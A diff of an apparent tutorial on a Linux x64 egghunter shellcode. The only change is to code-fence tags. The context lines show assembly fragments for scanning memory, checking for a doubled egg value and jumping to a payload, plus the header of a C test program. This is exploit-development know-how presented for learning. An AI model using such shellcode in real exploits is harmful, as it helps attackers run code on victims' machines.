@@ -39,7 +39,7 @@ Well, if you try that, you will quickly discover that your egghunter crash the h
 
 #### Assembly for our Link Function  
 
-```asm
+```nasm
  lea rdi, [rdx+0x8]  ; ARG1=*oldpath
  xor rsi, rsi        ; ARG2=*newpath
  xor rax, rax        ; reset rax for syscall
@@ -52,7 +52,7 @@ If the memory at the address in the `RDI` register is not readable, an error cod
 
 #### Next Memory Page Assembly  
 
-```asm  
+```nasm  
 nextPage:            ; Increment RDX to the next memory page
  or dx, 0xfff        ; 0xfff = 4096. Size of page
 nextAddress:         ; Increment RDX to the next memory address
@@ -71,7 +71,7 @@ nextAddress:         ; Increment RDX to the next memory address
 ### Check for the Egg
 If the memory is readable, then we will check to see if our egg exists at the memory location.
 
-```asm  
+```nasm  
  jz nextPage         ; If no, check the next memory page
  xor rbx, rbx
  add ebx, 0x50905090 ; Configure Egg in RBX
@@ -84,7 +84,7 @@ If the egg does not exist, then we will increase the memory address by 1 byte an
 ### Check for a Double Egg
 If the egg exists, we will see if there are two instances of our egg, or only one. If only one egg exists, then that is not the egg(s) we are looking for. In such a case of only 1 egg, we will keep our scan continuing. Although if our egg exists twice, we will jump to our eggs and execute our payload.
 
-```asm
+```nasm
  cmp [rdx], ebx      ; Egg?
  jnz nextAddress     ; No Egg? Go to next memory page
  cmp [rdx+0x4], ebx  ; second Egg?
@@ -96,7 +96,7 @@ If the egg exists, we will see if there are two instances of our egg, or only on
 
 #### EggHunter Assembly
 
-```asm  
+```nasm  
 ; Filename: eggHunter.nasm
 ; Author:   boku
 global _start
@@ -144,7 +144,7 @@ To test the egghunter, we create a simple C program that will search for our egg
 
 
 #### EggHunter C Program
-```asm
+```nasm
 // Shellcode Title:  Linux/x64 - EggHunter Execve Shellcode (63 Bytes)
 // Shellcode Author: Bobby Cooke
 // Tested On:        Kali Linux 5.3.0-kali3-amd64 x86_64
